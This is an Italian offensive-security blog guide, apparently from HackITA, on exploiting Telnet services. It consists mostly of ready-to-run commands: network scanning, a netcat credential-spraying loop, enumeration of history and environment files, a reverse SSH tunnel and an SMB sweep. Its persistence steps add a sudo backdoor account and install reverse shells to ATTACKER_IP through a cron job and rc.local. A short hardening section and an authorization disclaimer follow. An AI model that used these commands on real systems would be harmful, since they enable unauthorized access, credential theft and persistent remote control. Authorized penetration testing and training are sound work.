---
title: 'Telnet Exploitation: Credential Abuse, Pivoting e Lateral Movement su Porta 23'
slug: telnet
description: >-
  Telnet è ancora usato in ambienti legacy. Scopri come sfruttarlo per attacchi
  reali, accessi remoti e test su vecchi sistemi. Comandi e scenari pratici.
image: /telnet.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - telnet
  - '23'
  - ''
---

# Telnet Exploitation: Credential Abuse, Pivoting e Lateral Movement su Porta 23

Telnet non è solo un protocollo legacy: è una backdoor involontaria in ambienti enterprise. In internal assessment, l'esposizione di Telnet si traduce in credential harvesting immediato, pivot point per lateral movement e vettore per privilege escalation. Questa guida operativa mappa l'intera kill chain da enumerazione a dominio della rete.

## Perché Telnet è un Moltiplicatore di Compromissione

In ambienti legacy reali, Telnet non è solo un servizio insicuro: è un acceleratore per compromissioni a catena. La trasmissione in chiaro delle credenziali consente credential harvesting passivo da qualsiasi host nello stesso segmento di broadcast. Il riutilizzo delle stesse password su account domain-joined trasforma un servizio di gestione locale in un vettore per il domain compromise. La mancanza di cifratura permette MITM attivi per session hijacking e command injection. A differenza di SSH, non esiste autenticazione a chiave pubblica, logging dettagliato o meccanismi di integrity checking.

## TL;DR Operativo (Flusso a Step)

1. **Ricognizione Aggressiva:** Scansione full-port e fingerprinting mirato per identificare Telnet su porte standard e non standard (2323, 8023). Uso di script NSE per banner grabbing dettagliato.
2. **Credential Spraying & Abuse:** Tentativi di autenticazione con credenziali default per vendor specifici e riutilizzo di password trovate in altri contesti (config file leak, password reuse).
3. **Accesso e Enumerazione Post-Auth:** Comandi immediati per comprendere l'ambiente (utenti, network, processi) e cercare materiale sensibile (chiavi SSH, backup).
4. **Privilege Escalation Locale:** Ricerca di misconfigurazioni SUID, cron job scrivibili, servizi locali vulnerabili e riutilizzo della password per utenti privilegiati (es. root, admin).
5. **Pivoting e Lateral Movement:** Utilizzo dell'host come pivot per scansioni interne, reutilizzo delle credenziali su altri servizi (SSH, SMB) e esfiltrazione dati attraverso sessioni grezze.

***

## Fase 1: Ricognizione & Enumerazione Aggressiva

**Scansione di Network Segment:**

```bash
nmap -p 23 --open -sV -oA telnet_standard 10.10.10.0/24
nmap -p 23,2323,8023,2000-2010 --open -sV -oA telnet_nonstd 10.10.10.0/24
nmap -p- --min-rate 1000 -T4 -oA full_tcp 10.10.10.100
nmap -p 23,2323,8023 -sV --script=telnet-* -oA telnet_details 10.10.10.100
```

**Connessione Manuale per Analisi:**

```bash
telnet 10.10.10.100 23
```

***

## Fase 2: Sfruttamento Iniziale e Credential Abuse

### Credential Spraying e Password Reuse Strategy

**Esempio di Spraying Mirato:**

```bash
for cred in "admin:admin" "cisco:cisco" "root:default"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    echo "Trying $user:$pass"
    echo -e "$user\n$pass" | timeout 3 nc -nv 10.10.10.100 23 2>&1 | grep -v "Connection refused" && echo "Potential hit!"
done
```

***

## Fase 3: Post-Compromise & Privilege Escalation Avanzata

**Enumerazione Immediata Post-Auth:**

```bash
id
sudo -l 2>/dev/null
uname -a
cat /etc/passwd | grep -v nologin
ip a || ifconfig
netstat -antp || ss -antp
```

### Privilege Escalation Locale Post-Telnet

Controlli avanzati per Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

Analisi variabili d'ambiente e processi:

```bash
cat /proc/self/environ
ps auxwww
```

Ricerca file history e backup:

```bash
find / -name "*.bak" -o -name "*~" -o -name ".bash_history" 2>/dev/null
cat ~/.bash_history | tail -50
```

Check servizi locali e porte interne:

```bash
netstat -ant | grep 127.0.0.1
ss -ltnp | grep 127.0.0.1
```

Verifica mount NFS interni:

```bash
mount | grep nfs
showmount -e localhost 2>/dev/null
```

Analisi SUID/GUID e cron job:

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
crontab -l
ls -la /etc/cron* /var/spool/cron/
```

***

## Fase 4: Pivoting e Lateral Movement Avanzato

**Reverse SSH Tunnel per Accesso Inbound:**

Dall'host compromesso (dove disponibile SSH client):

```bash
ssh -R 2222:localhost:22 -N -f kali@ATTACKER_IP
```

Dalla tua macchina Kali:

```bash
ssh -p 2222 localhost
```

**Pivot da Segmento Legacy verso Rete AD Interna:**

1. Dopo aver ottenuto l'accesso a un host via Telnet, cercare credenziali in file di configurazione
2. Identificare subnet interne con `ip route` o `route print`
3. Usare l'host come proxy per scan della rete AD:

```bash
# Sull'host compromesso se presente netcat
for i in {1..254}; do timeout 1 nc -zv 10.20.30.$i 445 2>&1 | grep succeeded; done
```

***

## Persistence Post-Telnet Access

**Aggiunta Utente Locale (Linux):**

```bash
useradd -m -s /bin/bash backupadmin
echo "backupadmin:Password123!" | chpasswd
usermod -aG sudo backupadmin
```

**Inserimento Chiave SSH in authorized\_keys:**

```bash
echo "ssh-rsa AAAAB3NzaC... kali@attack" >> /home/backupadmin/.ssh/authorized_keys
```

**Cron Job per Reverse Shell Persistente:**

```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done'") | crontab -
```

**Modifica rc.local per Persistenza al Boot:**

```bash
echo "/usr/bin/nohup /bin/bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1 &" >> /etc/rc.local
```

***

## Fase 5: Detection & Hardening Concreti

**Indicatori di Compromissione (IoCs) Concreti:**

Log di autenticazione da `/var/log/auth.log`:

```
Jan 28 10:15:23 legacy-server telnetd[1234]: session opened for user admin from [10.20.30.40]
Jan 28 10:16:00 legacy-server telnetd[1235]: session closed for user admin
```

**Hardening Tecnico:**

```bash
systemctl disable --now telnet.socket
apt remove telnetd -y
```

***

## Errori Comuni Negli Assessment che Portano a Compromissioni

* Credenziali di default attive su appliance di rete
* Configurazioni di backup esposte con password in chiaro
* Segmentazione di rete assente tra segmenti legacy e rete produzione
* Password reuse aziendale tra account locali e domain
* Logging e alerting assenti per sessioni Telnet di successo

***

## Playbook Operativo 80/20: Telnet in Internal Assessment

| Obiettivo                        | Azione Concreta                                  | Comando/Tool Esempio                               |
| -------------------------------- | ------------------------------------------------ | -------------------------------------------------- |
| Scoperta servizi Telnet          | Scansione porte standard e non-standard          | `nmap -p 23,2323,8023 --open -sV 10.10.10.0/24`    |
| Banner grabbing e fingerprinting | Analisi dettagliata del servizio                 | `telnet 10.10.10.100 23` + NSE script `telnet-*`   |
| Credential spraying mirato       | Tentativi con credenziali default del vendor     | Wordlist mirate (es. `cisco-default-creds.txt`)    |
| Enumerazione post-autenticazione | Raccolta info su utenti, rete, processi          | `id; sudo -l; ip a; netstat -antp`                 |
| Privilege escalation locale      | Ricerca SUID, cron job, password reuse per root  | `find / -perm -4000 2>/dev/null; su root`          |
| Pivoting e lateral movement      | Reutilizzo password su altri servizi (SSH, SMB)  | `ssh user@internal-ip` con stessa password         |
| Rilevamento traffico in chiaro   | Sniffing per dimostrare rischio                  | `sudo tcpdump -A -i eth0 port 23`                  |
| Hardening definitivo             | Disabilitazione servizio e segmentazione di rete | `systemctl disable telnet.socket` + VLAN isolation |

***

## Lab Multi-Step: Internal Network Realistico

Lo scenario "LegacyCorp Breach" replica un'infrastruttura aziendale con:

1. Compromissione iniziale via Telnet su server Ubuntu 16.04
2. Privilege escalation tramite cron job misconfigured
3. Pivoting a jump host interno via chiave SSH rubata
4. Lateral movement in Active Directory tramite password reuse
5. Domain compromise e persistence

***

## HackITA — Supporta la Formazione Offensiva Indipendente

Se questo contenuto ti ha dato valore e vuoi sostenere la crescita di HackITA:

👉 [https://hackita.it/supporta](https://hackita.it/supporta)

Il tuo contributo finanzia lab realistici, scenari Red Team multi-step e guide operative ad alto livello tecnico.

***

## Vuoi Testare la Tua Azienda o Elevare le Tue Skill?

Assessment Red Team su misura, simulazioni di attacco complete e percorsi formativi avanzati:

👉 [https://hackita.it/servizi](https://hackita.it/servizi)

***

## Risorse Tecniche Esterne Correlate

* RFC 854 – Telnet Protocol Specification
  [https://datatracker.ietf.org/doc/html/rfc854](https://datatracker.ietf.org/doc/html/rfc854)
* Nmap NSE Scripts – Telnet Scripts
  [https://nmap.org/nsedoc/scripts/telnet-brute.html](https://nmap.org/nsedoc/scripts/telnet-brute.html)
* MITRE ATT\&CK – Lateral Movement (TA0008)
  [https://attack.mitre.org/tactics/TA0008/](https://attack.mitre.org/tactics/TA0008/)

*Questa guida è per scopi formativi in ambienti controllati e autorizzati. Ogni test su sistemi di terze parti richiede autorizzazione scritta esplicita.*
